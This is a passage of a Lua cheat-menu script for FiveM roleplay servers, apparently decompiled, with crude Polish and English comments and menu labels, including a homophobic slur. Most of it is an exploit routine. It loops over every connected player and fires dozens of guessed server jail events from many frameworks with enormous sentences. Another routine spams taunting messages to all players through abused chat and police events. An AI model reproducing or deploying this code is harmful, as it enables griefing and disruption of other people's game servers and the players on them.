...
--decrypted by xseira fucking gay shit
    ...
    local allMenus = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu", 
                                ...
                                "ESXMiscMenu", "ESXDrugMenu", "VRPMenu", "jdWmevaIfefura", "MoneyP", "TrollP", "AvizonRPM", "GGRPM", "OurRPM", "JamajkaRPM", "MoroRPM", "Credits", "SpawnPedsMenu", "Themes", "CarTypeSelection" ,"CarOptions", 
    ...
    function xseira.CreateMenu(id, title)
        ...
        menus[id].subTitle = 'BekaZfefuraMenu'
        ...
        Citizen.CreateThread(function()
            while Enabled do
                if discordPresence then
                    ...
                    SetDiscordRichPresenceAssetText('jdwfefura')
    ...
    Citizen.CreateThread(
        function()
            ...
            xseira.CreateMenu("MainMenu", "beczkaZfefuraiMeva")
            ...
            xseira.CreateSubMenu("MevPiszczala", "MainMenu", "fefur zjeb")
			
			xseira.CreateSubMenu("TrollP", "bkZmeva", "Trollowanie XD")	
			xseira.CreateSubMenu("MoneyP", "bkZserwera", "Pienionzki")
			--Pieniadze
        ...
        for i=0, 256 do
				...
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				TriggerServerEvent("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:*", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:eloelo90", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:wwiezienie", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("searp:sendToJail", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva")
				TriggerServerEvent("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:sendToJailhype", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432, 'SenseiToUjJebanyWDupeCfelPierdolony1337Kurwo')
				TriggerServerEvent("17A34C820A685513C5B4ADDD85968B9E905CC300A261EB55D299ABCB6C90AAA872712B3B6C13DC41913FCC2BE84A07EF9300DC4E89669A4B0E6FBB344A69D239", GetPlayerServerId(i), 5023432432434200, "beeeeeka z fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:sendToJail132", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:fabianfudalijebanyprzyglup", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jebackoguszkaa_jailer:sendToJail", GetPlayerServerId(i), 5023432432434200, "Jd w fefura i meva", -32432432423432432)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 9999999999)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 9999999999)
				...
				TriggerServerEvent("esx_jailer:sendToJial", GetPlayerServerId(i), 59999, "Jd w fefura i meva", 9333397)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 59999, "Jd w fefura i meva", 9333397)
				TriggerServerEvent("esx-jail:jailPlayer", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 9999999999)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 9999999999)
				TriggerServerEvent("esx_policejob:message", GetPlayerServerId(i), "Jd w fefura i meva")
				TriggerServerEvent("hazerp:wyslijdopaki", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TriggerServerEvent("8321hiue89js", GetPlayerServerId(i), 5007, "Jd w fefura i meva", 323434532532, securityToken)
				TriggerServerEvent("esx_jailer:sendToJailjebacdisafrajerze", GetPlayerServerId(i), 300000, "Jd w fefura i meva", 500324532)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 999999999 * 60, "Jd w fefura i meva")
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."Jd w fefura i meva")
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 300)
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "Jd w fefura i meva")
				...
				TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 9999999999 * 60, "Jd w fefura i meva", 1337)
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 999999 * 60, "Jd w fefura i meva")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "Jd w fefura i meva")
				TriggerServerEvent("wysparp_tablet:SendMessage", GetPlayerServerId(i), 9999 * 60, "FAJNY TEN FEFUR", 9999999999)
				TriggerServerEvent("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 9999 * 60, "TEST", 1,2137)
				TriggerServerEvent("esxjailer:sendToJail2", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 1)
				TriggerServerEvent('esx:wiezienie', GetPlayerServerId(i), 9937, "Jd w fefura i meva", 1)
				TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 1)
				TriggerServerEvent("arisonarp:wiezienie",  GetPlayerServerId(i), 9937, "Jd w fefura i meva", 1)
				TriggerServerEvent("esx_jail:sendTooJail", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 1)
				TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 1)
				TriggerServerEvent("esxjailer:sendTooJail", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 1)
				TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 1)
				TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 1)
				TriggerServerEvent("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 9937, "Jd w fefura i meva", 9995345349999999)
				TriggerServerEvent("esx_jaler:sendToWiezz", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 9995345349999999)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "Jd w fefura i meva", 9995345349999999)
				TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 9937 * 60, "Jd w fefura i meva", 9995345349999999)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "Jd w fefura i meva")
				TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 99999, "Jd w fefura i meva")
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva")
				TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_jailer:jail", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("luki_jailer:sendToJail", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 99999 * 60)
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 999999 * 60, "Jd w fefura i meva")
				TriggerServerEvent("wiezieniejailer:sendToJail",3, GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 1,2137)
				TriggerServerEvent("esxjailer:sendToJail2", GetPlayerServerId(i), 99999, "Jd w fefura i meva", 1)
				TriggerServerEvent('esx:wiezienie', GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("arisonarp:wiezienie",  GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_jail:sendTooJail", GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esxjailer:sendTooJail", GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esxjailer:sendToJailf", GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esxjailers:sendToJail", GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_jailer:sendToWiezz",  GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 99999, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_jailer:sendToJailf", GetPlayerServerId(i), 99999 * 60, "Jd w fefura i meva", 99953)
				TriggerServerEvent("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 9999 * 60, "Jd w fefura i meva", 9999)
				TriggerServerEvent("esx_jailer:sendToJailhype", GetPlayerServerId(i), 100 * 60, "Jd w fefura i meva", 999)
				TriggerServerEvent("esx-qalle-jail:wyslijwiezienie", GetPlayerServerId(i), 60*1, "Jd w fefura i meva", 111)
        end
      end
	  ...
	  local function ss()
		   for i = 0, 256 do
			if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 then
				print("xD")
				TriggerServerEvent('esx_policejob:message',  GetPlayerServerId(i), '~r~ktos mowi jd w ten serwer ~w~\n~b~czesc klalny ~w~\n ~f~beka z was \n')
				TriggerServerEvent("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~ktos mowi jd w ten serwer ~w~\n~b~czesc klalny ~w~\n ~f~tutaj fefur i mev glupi jestesmy \n')
				TriggerServerEvent("searp:SendMessage", GetPlayerServerId(i), -34234234234234234324332, "klanMenu")
				TriggerServerEvent("wyspa_jail:SendMessagea", GetPlayerServerId(i), -34234234234234234324332, "KlanMenu")
				TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), -34234234234234234324332, "klalnMenu")
			end
		end
	end
        ...
        local SelectedPlayer
            ...
            while Enabled do
                ...
                if intro == 0 then
                    scaleform = Initialize("mp_big_message_freemode", "~r~ kominiara rogal")
            ...
            elseif dA.id ~= 13 and dA.id ~= 12 and xseira.Button(dA.name.." Upgrade 4", price4) then 
                ...
                if xseira.IsMenuOpened("MainMenu") then
                    drawNotification("~f~Czesc klaunie")
                    if xseira.MenuButton("∑Self Menu", "SelfMenu") then
					elseif xseira.MenuButton("∑~r~klaln ~w~∑Options", "klaunMenu") then
...
--========================================================================================================
			 xseira.Display()
            elseif xseira.IsMenuOpened("klaunMenu") then
			  if xseira.MenuButton("~p~-> ~r~Slabiutkie ~f~SERWERY~p~ <-", "MoneyP") then
